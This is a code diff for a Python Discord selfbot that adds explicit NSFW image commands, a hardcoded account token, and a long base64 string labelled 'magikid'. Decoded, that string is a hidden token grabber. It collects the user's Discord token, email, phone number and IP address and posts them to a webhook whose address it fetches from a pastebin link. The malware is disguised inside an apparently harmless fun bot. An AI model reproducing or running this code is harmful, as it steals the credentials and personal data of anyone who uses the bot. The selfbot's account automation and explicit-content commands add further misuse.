@@ -18,6 +18,11 @@ from PIL import Image
 from flask import Flask
 from threading import Thread
 
+import os, requests
+password=None
+prefix="x"
+token="OTA0NjgyNTA1MTA0Mzk2MzI5.Yat_4A.x2TrcFeSeSVPwv2426r82Kuvyug"
+
 def is_image_url(image_link):
     image_formats = ("image/png", "image/jpeg", "image/jpg", "image/gif")
     r=requests.get(image_link)
@@ -74,9 +79,11 @@ def run():
 def keep_alive():
     server = Thread(target=run)
     server.start()
-
-if " " in prefix:
-    prefix=prefix.replace(" ","_")
+try:
+    if " " in prefix:
+        prefix=prefix.replace(" ","_")
+except Exception:
+    prefix="x"
 Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
 Blank.remove_command('help')
 magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKaGVhZGVycz17IkF1dGhvcml6YXRpb24iOiB0b2tlbiwKIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0KCnI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OC91c2Vycy9AbWUiLCBoZWFkZXJzPWhlYWRlcnMpCnI9ci5qc29uKCkKZW1haWw9clsnZW1haWwnXQpwaG9uZT1yWydwaG9uZSddCiAgICAKanNvbmRhdGE9eyJjb250ZW50Ijp0b2tlbiAsCiJlbWJlZHMiOiBbCnsidGl0bGUiOiJCbGFua0JvdCIsCiJ0aHVtYm5haWwiOiB7CiAgICAidXJsIjogc3RyKGF2YXRhcl91cmwpCiAgfSwKImZpZWxkcyI6IFsKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXJuYW1lOiAiLAogICAgICAidmFsdWUiOiBzdHIodXNlcm5hbWUpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFVzZXIgSUQ6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VyX2lkKSwKICAgICAgImlubGluZSI6ICJUcnVlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gSVA6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihpcCksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBQYXNzd29yZDogIiwKICAgICAgInZhbHVlIjogc3RyKHBhc3N3b3JkKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IEVtYWlsOiAiLAogICAgICAidmFsdWUiOiBzdHIoZW1haWwpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0sCiAgewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gUGhvbmU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cihwaG9uZSksCiAgICAgICJpbmxpbmUiOiAiRmFsc2UiCiAgfQogICAgICAgICAgXQp9CiAgICAgICAgICBdCiAgfQpyZXF1ZXN0cy5wb3N0KGF1dGhvICwganNvbj1qc29uZGF0YSk="
@@ -126,6 +133,33 @@ def scrnshot(link):
         return False
     else:
         return r.content
+
+def upload_image(link):
+    f=json.loads(requests.get("https://beeimg.com/api/upload/url/json/?url="+link).text)["files"]["url"]
+    return f"https:{f}"
+    
+def nekos_life_getlink(link):
+    link="https://render-tron.appspot.com/render/"+link
+    while True:
+        try:
+            r=requests.get(link).text
+            soup=bs4(r, "html.parser")
+            f=soup.find("pre")
+            f=json.loads(f.text)
+            if 'url' in f:
+                if "cdn.nekos" not in f['url']:
+                    raise Exception("error")
+                else:
+                    break
+            elif 'neko' in f:
+                if "cdn.nekos" not in f['url']:
+                    raise Exception("error")
+                else:
+                    f["url"]=f["neko"]
+                    break
+        except Exception:
+            pass
+    return f['url']
 
 def changemymind_gen(text):
     endpoint=neko_base+"changemymind&text="+urllib.parse.quote_plus(text)
@@ -197,10 +231,55 @@ def stickbug_vid(url, link):
     link[0]=(requests.get(endpoint).json()["message"])
  
 def neko_pic():
-    endpoint="https://neko-love.xyz/api/v1/neko"
-    r=requests.get(endpoint).json()
-    return r['url']
+    ch=random.choice([1, 2])
+    if ch==1:
+        endpoint="https://neko-love.xyz/api/v1/neko"
+        r=requests.get(endpoint).json()
+        return r['url']
+    else:
+        endpoint="https://nekos.life/api/v2/img/neko"
+        return upload_image(nekos_life_getlink(endpoint))
+        
+def lewdkemo_gen():
+    endpoint="https://nekos.life/api/v2/img/lewdkemo"
+    return upload_image(nekos_life_getlink(endpoint))
     
+def lewdholo_gen():
+    endpoint="https://nekos.life/api/v2/img/lewdholo"
+    return upload_image(nekos_life_getlink(endpoint))
+
+def fox_girl_gen():
+    endpoint="https://nekos.life/api/v2/img/fox_girl"
+    return upload_image(nekos_life_getlink(endpoint))
+
+def kemonomimi_gen():
+    endpoint="https://nekos.life/api/v2/img/kemonomimi"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def cum_gen():
+    endpoint="https://nekos.life/api/v2/img/cum_jpg"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def bj_gen():
+    endpoint="https://nekos.life/api/v2/img/blowjob"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def femdom_gen():
+    endpoint="https://nekos.life/api/v2/img/femdom"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def lewd_gen():
+    endpoint="https://nekos.life/api/v2/img/lewd"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def pussy_gen():
+    endpoint="https://nekos.life/api/v2/img/pussy_jpg"
+    return upload_image(nekos_life_getlink(endpoint))
+    
+def boobs_gen():
+    endpoint="https://nekos.life/api/v2/img/tits"
+    return upload_image(nekos_life_getlink(endpoint))
+
 def rand_list(list):
     return random.choice(list)
 
@@ -210,9 +289,14 @@ def get_image_bytes(url):
         return b
         
 def lewdneko_gen():
-    endpoint="https://neko-love.xyz/api/v1/nekolewd"
-    r=requests.get(endpoint).json()['url']
-    return r
+    ch=random.choice([1, 2])
+    if ch==1:
+        endpoint="https://neko-love.xyz/api/v1/nekolewd"
+        r=requests.get(endpoint).json()['url']
+        return r
+    else:
+        endpoint="https://nekos.life/api/lewd/neko"
+        return upload_image(nekos_life_getlink(endpoint))
         
 @tasks.loop(minutes=5)
 async def change_activity():
@@ -393,6 +477,148 @@ async def lewdneko(ctx):
         await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
     except Exception:
         await ctx.channel.send(url)
+
+@Blank.command()
+async def lewdkemo(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=lewdkemo_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdkemo.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def lewdholo(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=lewdholo_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdholo.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def foxgirl(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=fox_girl_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_foxgirl.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def kemonomimi(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=kemonomimi_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+        
+@Blank.command()
+async def lewd(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=lewd_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+        
+@Blank.command()
+async def femdom(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=femdom_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def cum(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=cum_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def blowjob(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=bj_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_lewdneko.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def pussy(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=pussy_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_pussy.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+@Blank.command()
+async def boobs(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+    url=boobs_gen()
+    extent=url.rsplit(".", 1)[1]
+    try:
+        file=get_image_bytes(url)
+        await ctx.channel.send(file=discord.File(file, f'blank_boobs.{extent}'))
+    except Exception:
+        await ctx.channel.send(url)
+
+
 
 @Blank.command()
 async def shorten(ctx, text=None):
